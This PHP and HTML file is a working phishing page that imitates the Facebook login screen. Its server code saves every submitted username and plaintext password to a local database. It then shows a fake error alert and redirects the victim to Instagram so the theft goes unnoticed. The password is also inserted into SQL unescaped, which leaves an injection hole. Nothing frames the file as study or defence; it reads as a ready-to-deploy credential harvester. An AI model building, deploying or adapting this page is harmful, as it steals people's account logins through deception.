<?php


$db=mysqli_connect('localhost','root','','insta');

if($_SERVER["REQUEST_METHOD"] == "POST"){
$name=mysqli_real_escape_string($db, $_POST['username']);
//$name=$_POST['username'];
$password=$_POST['password'];
if (empty($name)) { $errors="Username is required"; }
if (empty($password)) {
   echo'<script>alert("password required")</script>';     
}

if(!empty($name) AND !empty($password)){
  $sql="INSERT INTO users(username,password,Do,logs)
VALUES('$name','$password','facebook',now())";
if(mysqli_query($db,$sql)){
  echo"<script>alert('Error occured,Please try Again.)</script>";
  echo "<meta http-equiv='refresh' content='0;URL=https://www.instagram.com/'/>";
}

}




} 

 ?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Log In or Sign Up</title>
  <link rel="shortcut icon" type="image/png" href="fb.png"/>
  <!--Bootstrap-->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
    integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
  <!--Fontawesome CDN link-->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  <!--External CSS StyleSheet-->
  <link rel="stylesheet" href="styl.css">
  <!--Google fonts-->
  <link
    href="https://fonts.googleapis.com/css2?family=Audiowide&family=B612+Mono&family=Nosifer&family=Pacifico&display=swap"
    rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
  <link
    href="https://fonts.googleapis.com/css2?family=Audiowide&family=B612+Mono&family=Days+One&family=Nosifer&family=Pacifico&display=swap"
    rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
    <style type="text/css">
      input[type=text],[type=password]:focus{
    outline-color: #007bff;
    outline-width: 3px;
}

    </style>
</head>

<body>

  <div class="facebook">
    <div class="mobile-top-view">
      <img src="fb-mobile.png" alt="">
      <a href="#">Get Facebook for Android and browse faster.</a>
    </div>
    <div class="view">
      <div class="container">
        <!--Row-->
        <div class="row">
          <!--Column 1-->
          <div class="col title-div">
            <div>
              <h1 class="text-primary">facebook</h1>
              <p>Connect with friends and the world around you on Facebook.</p>
            </div>
          </div>
          <!--Column 2-->
          <div class="col-sm-5">
            <div class="card">
             <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">
              <div>
                <input id="email" name="username" class="input-group" type="text" placeholder="Email or Phone Number">
                <input id="pass" name="password" class="input-group my-2" type="password" placeholder="Password">
              
                
                <input type="submit" id="fbLogin" class="btn btn-primary btn-lg" style="width:100%;" value="Log In">
                </form>
                <hr id="hr1">
                <p id="forgetPass1" class="text-center my-3" style="font-size: 14px;"><a href="#">Forget account?</a>
                </p>
              </div>
              <hr id="hr2">
              <button id="createAcBtn" class="btn btn-success btn-lg">Create New Account</button>
              <p id="forgetPass2" class="text-center my-3"><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">Forget account?</a></p>

            </div>
            <p id="form-footer" class="text-center my-4" style="font-size: 14px;"><b>Create a Page</b> for a celebrity,
              brand or buisness.
            </p>
            <div class="mobile-version-footer">
              <div class="row language">
                <div class="col">
                  <p>English (US)</p>
                  <p>हिन्दी</p>
                  <p>Portugues (Brasil)</p>
                  <p>Deutsch</p>
                </div>
                <div class="col">
                  <p>नेपाली</p>
                  <p>Espanol</p>
                  <p>Francais (France)</p>
                  <p><i class="fa fa-plus-square"></i></p>
                </div>
              </div>
              <div class="nav">
                <ul>
                  <a href="">
                    <li>About</li>
                  </a>
                  <a href="">
                    <li>Help</li>
                  </a>
                  <a href="">
                    <li>More</li>
                  </a>
                </ul>
              </div>
            </div>
          </div>
          <!--Row End-->
        </div>
      </div>
    </div>
  </div>

  
</body>

</html>



